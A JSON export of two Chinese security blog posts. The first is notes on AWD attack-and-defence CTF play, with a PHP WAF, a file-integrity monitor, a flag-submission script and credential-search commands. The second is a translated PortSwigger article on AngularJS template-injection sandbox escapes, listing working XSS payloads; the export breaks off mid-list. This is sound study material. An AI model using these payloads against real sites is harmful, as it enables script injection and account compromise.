[{"title":"Web_番外篇_AWD芝士","url":"/2023/04/25/AWD/","content":"由于我对二进制一窍不通, 这里以web_awd为主, 这也不是我的教程, 而是参考了其他大佬文章做的笔记这里主要参考了两位大佬nul1和哈喽沃德er的两篇文章\n简介AWD: Attack With Defence, 强调攻防/实战/对抗, 综合考量队伍的渗透能力和防护能力\n比赛中, 每个队伍维护多台服务器, 服务器中存在多个漏洞, 利用漏洞攻击其他队伍就可以进行得分, 修复漏洞避免其他队伍攻击可以防止丢分\n\n一般分配web服务器(多数为Linux) 某处存在flag(一般在根目录下)\n肯能会提供一台流量分析虚拟机, 可以下载流量文件进行数据分析\nflag在主办方的设定下每隔一定时间刷新一轮\n各队一般有自己的初始分数\nflag被其他队伍拿走, 该队就会扣除一定积分\n扣除的积分由获取flag的队伍均分\n主办方会对每个队伍的服务进行check, 服务器宕机扣除本轮flag分数, 扣除的分数由服务check正常的队伍均分\n一般每个队伍会给一个低权限用户, 非root权限\n\n网络情况\n比赛中获取flag一般有两种模式\n\nflag在根目录下, 读取flag内容提交即可得分\n拿到其他队伍的shell后, 执行指定命令curl 10.0.0.2即可从上图flag机获取flag内容\n\n比赛可能会告诉你其他队伍的IP, 也有可能不告诉你, 一般实在同一个C段或者B段, 可以利用nmap等攻击扫描发现其他队伍的IP\nnmap -sn 192.168.71.0/24\n\n或者用https://github.com/zer0h/httpscan 的脚本进行扫描\n比赛套路弱口令修改弱口令密码, 主办方设置的密码极有可能时弱口令, 包括但不限于ssh/phpcms/wordpress, 需要立即修改口令, 改完自己队伍的之后可以看一下其他队伍的有没有修改. \n不过, 有些比赛不允许修改后台口令, 如果修改视为服务器宕机\n备份源码并查找预留后门备份源码, 比赛开始第一件事就是备份源码, 将网站源码下载后复制一下, 用D盾扫描一份预留一份防止宕机, D盾扫描后也会发现一些预留后门, 第一时间删除后门后, 然后利用这个后门发起一波攻击\n数据库备份登录数据库备份, 当数据被删除的时候可以使用命令快速还原\nmysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库 \n\n还原命令\nmysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库 \n\n关闭不必要的端口一些端口会存在漏洞, 为了保证安全, 我们关闭一些不必要的端口\n\n部署WAF这里推荐一个AoiAWD\nCTFDefense\n但是这里要注意规则是否允许第三方通防\n也可以使用这个\n&lt;?php//Code By Safe3 function customError($errno, $errstr, $errfile, $errline)&#123;  echo &quot;&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;&quot;; die();&#125;set_error_handler(&quot;customError&quot;,E_ERROR);$getfilter=&quot;&#x27;|(and|or)\\\\b.+?(&gt;|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;$postfilter=&quot;\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;$cookiefilter=&quot;\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;;function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)&#123;  if(is_array($StrFiltValue))&#123;    $StrFiltValue=implode($StrFiltValue);&#125;  if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$StrFiltValue)==1)&#123;           //slog(&quot;&lt;br&gt;&lt;br&gt;操作IP: &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;].&quot;&lt;br&gt;操作时间: &quot;.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;).&quot;&lt;br&gt;操作页面:&quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot;&lt;br&gt;提交方式: &quot;.$_SERVER[&quot;REQUEST_METHOD&quot;].&quot;&lt;br&gt;提交参数: &quot;.$StrFiltKey.&quot;&lt;br&gt;提交数据: &quot;.$StrFiltValue);        print &quot;360websec notice:Illegal operation!&quot;;        exit();&#125;      &#125;  //$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);foreach($_GET as $key=&gt;$value)&#123;     StopAttack($key,$value,$getfilter);&#125;foreach($_POST as $key=&gt;$value)&#123;     StopAttack($key,$value,$postfilter);&#125;foreach($_COOKIE as $key=&gt;$value)&#123;     StopAttack($key,$value,$cookiefilter);&#125;if (file_exists(&#x27;update360.php&#x27;)) &#123;    echo &quot;请重命名文件update360.php，防止黑客利用&lt;br/&gt;&quot;;    die();&#125;function slog($logs)&#123;  $toppath=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&quot;/log.htm&quot;;  $Ts=fopen($toppath,&quot;a+&quot;);  fputs($Ts,$logs.&quot;\\r\\n&quot;);  fclose($Ts);&#125;?&gt;\n\n使用方法:\n\n将waf.php传到包含的文件目录\n在页面中加入防护, 有两种做法, 根据情况二选一即可\n\n在首页面加入代码\nrequire_once(&#x27;waf.php&#x27;);\n\n就可以做到页面防注入、跨站如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！添加require_once(‘waf.php’);来调用本代码常用php系统添加文件\nPHPCMS V9   \\phpcms\\base.phpPHPWIND8.7  \\data\\sql_config.phpDEDECMS5.7  \\data\\common.inc.phpDiscuzX2    \\config\\config_global.phpWordpress   \\wp-config.phpMetinfo     \\include\\head.php\n\n在每个文件最前加上代码在php.ini中找到:\nAutomatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径;\n\n需要注意的是, 部署waf可能会导致服务不可用, 需要谨慎部署\n文件监控\n# -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;Special_string = &#x27;drops_log&#x27;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123;    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = &#123;&#125;    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])if __name__ == &#x27;__main__&#x27;:    print u&#x27;---------start------------&#x27;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#x27;[*] pre work end!&#x27;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#x27;r&#x27;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))                    except Exception as e:                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\\n&#x27;)                        f.close()                    except Exception as e:                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#x27;r&#x27;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\\n&#x27;)                        f.close()                    except Exception as e:                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#x27;[*] &#x27; + getUnicode(time.ctime())\n\n批量脚本比赛中我们的对手不止有一个, 这里就需要我们批量getshell, 批量提交flag\n就像上面所说的预留后门, 不需要专门去打, 可以直接批量getshell\n可以使用discuz-ml-rce\nflag也是批量提交效率才会高一些\n#!/usr/bin/env python2import sysimport jsonimport urllibimport httplibserver_host = &#x27;10.10.0.2&#x27;server_port = 80def submit(team_token, flag, host=server_host, port=server_port, timeout=5):    if not team_token or not flag:        raise Exception(&#x27;team token or flag not found&#x27;)    conn = httplib.HTTPConnection(host, port, timeout=timeout)    params = urllib.urlencode(&#123;        &#x27;token&#x27;: team_token,        &#x27;flag&#x27;: flag,    &#125;)    headers = &#123;        &quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;    &#125;    conn.request(&#x27;POST&#x27;, &#x27;/api/submit_flag&#x27;, params, headers)    response = conn.getresponse()    data = response.read()    return json.loads(data)if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) &lt; 3:        print &#x27;usage: ./submitflag.py $team_token $flag&#x27;        sys.exit()    host = server_host    if len(sys.argv) &gt; 3:        host = sys.argv[3]    print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4)\n\n流量日志通过流量、日志的分析：\n1.感知可能正在发生的攻击，从而规避存在的安全风险\n2.应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失\n3.学习别人的攻击方法\n基于流量监控来实现，一个简单的脚本如下：\n&lt;?phpdate_default_timezone_set(&#x27;Asia/Shanghai&#x27;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#x27;PHP_SELF&#x27;]; //访问者要访问的文件名$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time = date(&#x27;Y-m-d H:i:s&#x27;,time()); //访问时间$logadd = &#x27;来访时间：&#x27;.$time.&#x27;--&gt;&#x27;.&#x27;访问链接：&#x27;.&#x27;http://&#x27;.$ip.$filename.&#x27;?&#x27;.$parameter.&quot;\\r\\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt; \n\n手工防御find / -name *flag* #查找flag位置\n\nfind .|xargs grep &quot;password&quot; #查找password\n\nnetstat -antulp | grep EST #查看以建立的连接和进程\n\nkill PID killall &lt;进程名&gt; #结束进程\n\nnetstat -ant|awk|grep |sed -e-e |sort|uniq -c|sort -rn #检测TCP连接数量\n\nchattr +i /etc/resolv.conf #chattr命令防止系统中某个关键文件被修改\n\n","tags":["Web","Study","PHP","AWD"]},{"title":"没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入","url":"/2022/05/12/AngularJS%20xss/","content":"文章引用自：https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs\n研究员加雷斯·海耶斯\n@garethheyes(蓝鸟)\n抽象的对极受欢迎的 JavaScript 框架AngularJS的天真使用将许多网站暴露给 Angular 模板注入。这种相对低调的服务器端模板注入兄弟可以与 Angular 沙箱逃逸相结合，以在其他安全站点上发起跨站点脚本( XSS ) 攻击。到目前为止，还没有公开的沙盒逃逸会影响 Angular 1.3.1+ 和 1.4.0+。这篇文章将总结 Angular 模板注入的核心概念，然后展示影响所有现代 Angular 版本的新沙箱逃逸的开发。\n介绍AngularJS 是 Google 编写的 MVC 客户端框架。使用 Angular，您通过 view-source 或 Burp 看到的包含“ng-app”的 HTML 页面实际上是模板，并将由 Angular 呈现。这意味着如果用户输入直接嵌入到页面中，应用程序可能容易受到客户端模板注入的攻击。即使用户输入是 HTML 编码的并且在属性内也是如此。\nAngular 模板可以包含表达式 ——双花括号内的类似 JavaScript 的代码片段。要了解它们是如何工作的，请查看以下 jsfiddle：\nhttp://jsfiddle.net/2zs2yv7o/\n文本输入 2 由 Angular 评估，然后显示输出：2。\n这意味着任何能够注入双花括号的人都可以执行 Angular 表达式。Angular 表达式本身不会造成太大伤害，但是当与沙箱逃逸结合使用时，我们可以执行任意 JavaScript 并造成严重破坏。\n以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用htmlspecialchars对输入进行 HTML 编码：\n以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用htmlspecialchars对输入进行 HTML 编码：\n\n第二页几乎相同，但 Angular 导入意味着可以通过注入 Angular 表达式来利用它，并且通过沙箱逃逸我们可以获得 XSS。\n\n请注意，您需要在 DOM 树中的表达式上方有“ng-app”。通常，Angular 站点会在根 HTML 或 body 标记中使用它。\n换句话说，如果一个页面是一个 Angular 模板，我们将更容易对它进行 XSS 攻击。只有一个问题 - 沙盒。幸运的是，有一个解决方案。\n沙盒Angular 表达式被沙盒化，“以保持应用程序职责的适当分离”。为了利用用户，我们需要突破沙箱并执行任意 JavaScript。\n让我们重用前面的小提琴，并在 Chrome 的源选项卡中的 angular.js 内的第 13275 行放置一个断点。在监视窗口中，添加一个新的监视表达式“fnString”。这将显示我们转换后的输出。1+1 转换为：\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  return plus(1, 1);&#125;;return fn;\n\n所以表达式被解析和重写，然后由 Angular 执行。让我们尝试获取 Function 构造函数：\nhttp://jsfiddle.net/2zs2yv7o/1/\n这是事情变得更有趣的地方，这是重写的输出：\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;constructor&#x27; in l),    v5;  if (!(v4)) &#123;    if (s) &#123;      v3 = s.constructor;    &#125;  &#125; else &#123;    v3 = l.constructor;  &#125;  ensureSafeObject(v3, text);  if (v3 != null) &#123;    v2 = ensureSafeObject(v3.constructor, text);  &#125; else &#123;    v2 = undefined;  &#125;  if (v2 != null) &#123;    ensureSafeFunction(v2, text);    v5 = &#x27;alert\\u00281\\u0029&#x27;;    ensureSafeObject(v3, text);    v1 = ensureSafeObject(v3.constructor(ensureSafeObject(&#x27;alert\\u00281\\u0029&#x27;, text)), text);  &#125; else &#123;    v1 = undefined;  &#125;  if (v1 != null) &#123;    ensureSafeFunction(v1, text);    v0 = ensureSafeObject(v1(), text);  &#125; else &#123;    v0 = undefined;  &#125;  return v0;&#125;;return fn;\n\n如您所见，Angular 依次遍历每个对象并使用 ensureSafeObject 函数对其进行检查。ensureSafeObject函数检查对象是 Function 构造函数、窗口对象、DOM 元素还是 Object 构造函数。如果任何检查为真，它将引发异常并停止执行表达式。它还通过使对全局变量的所有引用改为查看对象属性来防止访问全局变量。\nAngular 还有一些其他功能可以进行安全检查，例如ensureSafeMemberName和ensureSafeFunction。ensureSafeMemberName 检查 JavaScript 属性并确保它与 proto 等不匹配，并且 ensureSafeFunction 检查函数调用不调用 Function 构造函数或调用、应用和绑定。\n破坏消毒剂Angular sanitizer 是用 JavaScript 编写的客户端过滤器，它扩展了 Angular 以安全地允许使用名为 ng-bind-html 的属性进行 HTML 绑定，其中包含要过滤的引用。然后它接受输入并将其呈现在不可见的 DOM 树中，并对元素和属性应用白名单过滤。\n在测试Angular sanitizer时，我考虑过使用 Angular 表达式覆盖原生 JavaScript 函数。问题是 Angular 表达式不支持函数语句或函数表达式，因此您将无法用任何值覆盖函数。考虑了一会儿，我想到了 String.fromCharCode。因为该函数是从 String 构造函数调用的，而不是通过字符串文字，所以“this”值将是 String 构造函数。也许我可以后门 fromCharCode 函数！\n如何在无法创建函数的情况下对 fromCharCode 函数进行后门？简单：重用现有功能！问题是如何在每次调用 fromCharCode 时控制该值。如果我们使用 Array 连接函数，我们可以使 String 构造函数成为一个假数组。我们所需要的只是一个长度属性和一个 0 属性，用于我们的假数组的第一个索引，幸运的是它已经有一个长度属性，因为它的参数长度是 1。我们只需要给它一个 0 属性。这是如何做到的：\n\n当调用 String.fromCharCode 时，您每次都会得到字符串 &lt;iframe onload=alert(/Backdoored/)&gt; 而不是所需的值。这在 Angular 沙箱中完美运行。这是一个小提琴：\nhttp://jsfiddle.net/2zs2yv7o/2/\n我继续查看 Angular sanitizer 的代码，但我找不到任何会导致绕过的对 String.fromCharcode 的调用。我查看了其他原生函数，发现了一个有趣的函数：charCodeAt。如果我可以覆盖这个值，那么它将被注入到一个属性中而无需任何过滤。但是有一个问题：这次“this”值将是字符串文字，而不是字符串构造函数。这意味着我不能使用相同的技术来覆盖该函数，因为我将无法操作索引或长度，因为这对于字符串文字是不可写的。\n然后我想到了使用 [].concat; 使用此函数将按原样返回字符串和连接在一起的参数。下面的小提琴调用’abc’.charCodeAt(0)，所以你会期望输出是’97’（ascii a），但由于后门，它反而返回基本字符串加上参数。\nhttp://jsfiddle.net/2zs2yv7o/3/\n然后这破坏了消毒剂，因为我可以注入邪恶的属性。消毒剂代码如下所示：\nif (validAttrs[lkey] === true &amp;&amp; (uriAttrs[lkey] !== true || uriValidator(value, isImage))) &#123;  out(&#x27; &#x27;);  out(key);  out(&#x27;=&quot;&#x27;);  out(encodeEntities(value));  out(&#x27;&quot;&#x27;);&#125; \n\nOut 将返回过滤后的输出；key 指的是属性名；value 是属性值。这是 encodeEntities 函数：\nfunction encodeEntities(value) &#123; return value.  replace(/&amp;/g, &#x27;&amp;&#x27;).  replace(SURROGATE_PAIR_REGEXP, function(value) &#123;   var hi = value.charCodeAt(0);   var low = value.charCodeAt(1);   return &#x27;&amp;#&#x27; + (((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000) + &#x27;;&#x27;;  &#125;).  replace(NON_ALPHANUMERIC_REGEXP, function(value) &#123;   return &#x27;&amp;#&#x27; + value.charCodeAt(0) + &#x27;;&#x27;;  &#125;).  replace(/&lt;/g, &#x27;&lt;&#x27;).  replace(/&gt;/g, &#x27;&gt;&#x27;);&#125; \n\n粗体代码是发生注入的地方，因此开发人员显然希望 charCodeAt 函数返回一个 int。您可以防御性地编码并将值强制为 int，但如果攻击者可以覆盖本机函数，您可能已经拥有。这绕过了消毒剂，并使用类似的技术，我们可以突破沙箱。\n逃离沙箱我查看了查找 String.fromCharCode 调用的 Angular 源代码，发现了一个非常有趣的实例。在解析字符串文字时，他们使用它来输出值。我想我可以后门 fromCharCode 并破解已解析的字符串。这是一个小提琴：\nhttp://jsfiddle.net/2zs2yv7o/4/\n原来我可以后门 unicode 转义但不能打破重写的代码。\n然后我想知道我以前在消毒剂上使用的相同技术是否可以在这里与不同的本机功能一起使用。我认为使用 charAt 可以成功解析代码，但返回完全不同的输出并绕过沙箱。我尝试注入它并检查重写的输出。\n&#123;&#123;  &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=&quot;&quot;&#x27;)+&#x27;&#x27;&#125;&#125; \n\nhttp://jsfiddle.net/2zs2yv7o/5/\n控制台有一些有趣的结果，我从浏览器而不是 Angular 收到 JavaScript 解析错误。我查看了重写的代码，如下所示：\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v5, v6 = l &amp;&amp; (&#x27;x\\u003d\\u0022\\u0022&#x27; in l);  if (!(v6)) &#123;    if (s) &#123;      v5 = s.x = &quot;&quot;;    &#125;  &#125; else &#123;    v5 = l.x = &quot;&quot;;  &#125;  return v5;&#125;;fn.assign = function(s, v, l) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;x\\u003d\\u0022\\u0022&#x27; in l);  v3 = v4 ? l : s;  if (!(v4)) &#123;    if (s) &#123;      v2 = s.x = &quot;&quot;;    &#125;  &#125; else &#123;    v2 = l.x = &quot;&quot;;  &#125;  if (v3 != null) &#123;    v1 = v;    ensureSafeObject(v3.x = &quot;&quot;, text);    v0 = v3.x = &quot;&quot; = v1;  &#125;  return v0;&#125;;return fn; \n\n语法错误在上面以粗体显示，如果重写的代码正在生成 JavaScript 语法错误，这意味着我可以在重写的输出中注入我自己的代码！接下来我注入了以下代码：\n&#123;&#123;  &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=alert(1)&#x27;)+&#x27;&#x27;&#125;&#125; \n\n调试器在第一次调用时停止，我点击恢复，然后我脸上带着灿烂的笑容去吃午饭，因为甚至没有检查我就知道我拥有沙盒并且可能几乎每个版本都拥有。我吃完午饭回来，点击恢复，果然我收到了警报并打破了沙盒。这是小提琴：\nhttp://jsfiddle.net/2zs2yv7o/6/\n这是重写的代码：\n&quot;use strict&quot;;var fn = function(s, l, a, i) &#123;  var v5, v6 = l &amp;&amp; (&#x27;x\\u003dalert\\u00281\\u0029&#x27; in l);  if (!(v6)) &#123;    if (s) &#123;      v5 = s.x = alert(1);    &#125;  &#125; else &#123;    v5 = l.x = alert(1);  &#125;  return v5;&#125;;fn.assign = function(s, v, l) &#123;  var v0, v1, v2, v3, v4 = l &amp;&amp; (&#x27;x\\u003dalert\\u00281\\u0029&#x27; in l);  v3 = v4 ? l : s;  if (!(v4)) &#123;    if (s) &#123;      v2 = s.x = alert(1);    &#125;  &#125; else &#123;    v2 = l.x = alert(1);  &#125;  if (v3 != null) &#123;    v1 = v;    ensureSafeObject(v3.x = alert(1), text);    v0 = v3.x = alert(1) = v1;  &#125;  return v0;&#125;;return fn; \n\n如您所见，重写的代码包含警报。您可能会注意到这在 Firefox 上不起作用。这是给你的一个小挑战，试着让它在 Firefox 和 Chrome 上运行。选择下面的隐藏文本以获得挑战的解决方案：\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\n要深入查看 Angular 解析代码时发生的情况，请在 angular.js 的第 14079 行放置一个断点，按一次 resume 以跳过初始解析并通过在调试器中不断单击 step into function 来逐步执行代码。在这里，您将能够看到 Angular 错误地解析代码。它会认为 x=alert(1) 是第 12699 行的标识符。代码假定它正在检查一个字符，但实际上它正在检查一个更长的字符串，因此它通过了测试。见下文：\nisIdent= function(ch) &#123;  return (&#x27;a&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;z&#x27; ||      &#x27;A&#x27; &lt;= ch &amp;&amp; ch &lt;= &#x27;Z&#x27; ||      &#x27;_&#x27; === ch || ch === &#x27;$&#x27;); &#125;isIdent(&#x27;x9=9a9l9e9r9t9(919)&#x27;)\n\n该字符串是使用我们覆盖的 charAt 函数生成的，而 9 是传递的参数。由于代码的编写方式，它总是会通过测试，因为“a”、“z”等总是小于较长的字符串。幸运的是，在第 12701 行，原始字符串用于制作标识符。然后在第 13247 行，当创建赋值函数时，标识符将多次注入函数字符串，当使用 Function 构造函数调用时，它会注入我们的警报。\n这是针对 Angular 1.4 量身定制的最终有效载荷：\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\n结论如果您使用的是 Angular，您需要将用户输入中的花括号视为高度危险，或者完全避免服务器端反射用户输入。大多数其他 JavaScript 框架通过不支持 HTML 文档中任意位置的表达式来回避这种危险。\nGoogle 肯定知道这个问题，但我们不确定它在更广泛的社区中的知名度，尽管已有关于该主题的研究。Angular 的文档确实建议不要在模板中动态嵌入用户输入，但也误导性地暗示 Angular 不会将任何 XSS 漏洞引入其他安全代码中。这个问题甚至不仅限于客户端模板注入；Angular 模板注入可以（并且已经）在服务器端显示并导致 RCE。\n我认为这个问题到目前为止只是因为缺乏最新的 Angular 分支的已知沙箱逃逸而引起了更广泛的关注。所以现在可能是考虑为 JavaScript 导入制定补丁管理策略的好时机。\n这个沙盒逃逸事件于 2015 年 9 月 25 日私下报告给 Google，并于 2016 年 1 月 15 日在 1.5.0 版中进行了修补。鉴于 AngularJS 沙盒绕过的悠久历史，以及 Angular 坚持沙盒“并非旨在阻止攻击者” ，我们不认为更新 Angular 是表达式注入的可靠解决方案。因此，我们发布了新的Burp Scanner检查来检测客户端模板注入，并在下面包含了最新的 Angular 沙箱逃逸列表。\n更新…我们在这篇博文中提供了真实世界应用程序中的沙盒逃逸示例。我们还发布了基于 DOM 的 AngularJS 沙箱逃逸。\n更新…从 1.6 版开始，Angular 已经完全移除了沙箱\n沙盒逃脱我们正在积极维护XSS 备忘单上的沙盒逃逸列表：\n\n反射的 AngularJS 沙箱逃逸\n基于 DOM 的 AngularJS 沙箱逃逸\nAngularJS CSP 绕过\n\n沙盒绕过列表1.0.1 - 1.1.5\n马里奥·海德里希 (Cure53)\n&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.0 - 1.2.1\n扬·霍恩 （谷歌）\n&#123;&#123;a=&#x27;constructor&#x27;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.2 - 1.2.5\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;&#x27;a&#x27;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].charAt=&#x27;&#x27;.valueOf;$eval(&quot;x=&#x27;&quot;+(y=&#x27;if(!window\\\\u002ex)alert(window\\\\u002ex=1)&#x27;)+eval(y)+&quot;&#x27;&quot;);&#125;&#125;\n\n1.2.6 - 1.2.18\n扬·霍恩 （谷歌）\n&#123;&#123;(_=&#x27;&#x27;.sub).call.call(&#123;&#125;[$=&#x27;constructor&#x27;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&#x27;alert(1)&#x27;)()&#125;&#125;\n\n1.2.19 - 